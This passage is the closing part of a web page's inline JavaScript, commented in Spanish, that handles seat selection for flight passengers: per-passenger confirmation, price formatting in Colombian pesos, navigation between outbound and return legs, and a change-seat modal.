    el.dataset.pax = String(activePax);
  }

  updatePassengerCard(activePax);
  updateTotals();
  highlightActivePaxSeat();

  // saltar al siguiente pasajero sin asiento
  if (paxSelections[activePax]) {
    for (let i = 1; i <= PAX_COUNT; i++) {
      if (!paxSelections[i]) { setActivePax(i); break; }
    }
  }
}

function formatCOP(n){
  n = Math.round(n || 0);
  return 'COP ' + n.toLocaleString('es-CO');
}

// ---------- Funcionalidad de colapsar/expandir tarjetas ----------
document.addEventListener('DOMContentLoaded', () => {
  document.querySelectorAll('.left .option').forEach(optionCard => {
    const header = optionCard.querySelector('.option-card-header');
    if (header) {
      header.addEventListener('click', () => {
        // Toggle the 'expanded' class on the option card
        optionCard.classList.toggle('expanded');

        // Optional: Collapse other expanded cards
        document.querySelectorAll('.left .option.expanded').forEach(otherCard => {
          if (otherCard !== optionCard) {
            otherCard.classList.remove('expanded');
          }
        });
      });
    }
  });
});

// ---------- Continuar (ahora en el nuevo footer) ----------
document.addEventListener('DOMContentLoaded', () => {
  const nextBtn = document.querySelector('.right-panel-footer #nextBtn');
  if (!nextBtn) return;

  nextBtn.addEventListener('click', () => {
  const f = firstUnconfirmedIdx();

  // PASO 1: confirmar por turno
  if (f <= PAX_COUNT){
    if (!paxSelections[f]) return; // seguridad: el botón está deshabilitado si no hay asiento
    paxConfirmed[f] = true;

    // Avanza al siguiente pasajero pendiente
    const nextIdx = firstUnconfirmedIdx();
    if (nextIdx <= PAX_COUNT) {
        setActivePax(nextIdx);
    }
    
    // CORRECCIÓN: Se actualiza la UI de forma consistente para todos los casos.
    updatePassengerCard(f);
    updateTotals(); 

    return;
  }

  // PASO 2: todos confirmados -> continuar flujo original
  const sp = new URLSearchParams(window.location.search);

  if (LEG === 'outbound') {
    for (let i = 1; i <= PAX_COUNT; i++) {
      const sel = paxSelections[i];
      sp.set(`out_seat_${i}`, sel.code);
      sp.set(`out_seat_type_${i}`, sel.typeKey);
      sp.set(`out_seat_price_${i}`, String(sel.price));
    }
    if (!IS_ONE_WAY) {
      sp.set('leg', 'return');
      sp.set('step', 'seat');
      window.location.href = 'index.php?' + sp.toString();
    } else {
      sp.delete('step'); sp.delete('leg');
      window.location.href = 'partials/resultados-vuelos.php?' + sp.toString();
    }
  } else {
    for (let i = 1; i <= PAX_COUNT; i++) {
      const sel = paxSelections[i];
      sp.set(`ret_seat_${i}`, sel.code);
      sp.set(`ret_seat_type_${i}`, sel.typeKey);
      sp.set(`ret_seat_price_${i}`, String(sel.price));
    }
    sp.delete('step'); sp.delete('leg');
    window.location.href = 'partials/resultados-vuelos.php?' + sp.toString();
  }
});


});

// ---------- Lógica del Modal ----------
const modal = document.getElementById('changeSeatModal');
const closeModalBtn = document.getElementById('closeModalBtn');
const modalChangeSeatBtn = document.getElementById('modalChangeSeatBtn');

function showChangeSeatModal(paxIdx) {
  const sel = paxSelections[paxIdx];
  if (!sel) return;

  // Poblar datos del modal
  document.getElementById('modalPaxSeatCircle').textContent = sel.code;
  document.getElementById('modalPaxName').textContent = `Adulto ${paxIdx}`;
  document.getElementById('modalPaxSeatLabel').textContent = `${sel.typeName} - ${sel.pos}`;
  document.getElementById('modalPaxPrice').textContent = formatCOP(sel.price);
  
  // Guardar el índice del pasajero en el botón del modal
  modalChangeSeatBtn.dataset.paxIndex = paxIdx;

  modal.style.display = 'flex';
}

function hideChangeSeatModal() {
  modal.style.display = 'none';
}

closeModalBtn.addEventListener('click', hideChangeSeatModal);
modal.addEventListener('click', (e) => {
  if (e.target === modal) {
    hideChangeSeatModal();
  }
});

modalChangeSeatBtn.addEventListener('click', () => {
  const paxIdx = parseInt(modalChangeSeatBtn.dataset.paxIndex, 10);
  if (paxIdx) {
    unconfirmAndEdit(paxIdx);
    hideChangeSeatModal();
  }
});


</script>
</body>
</html>
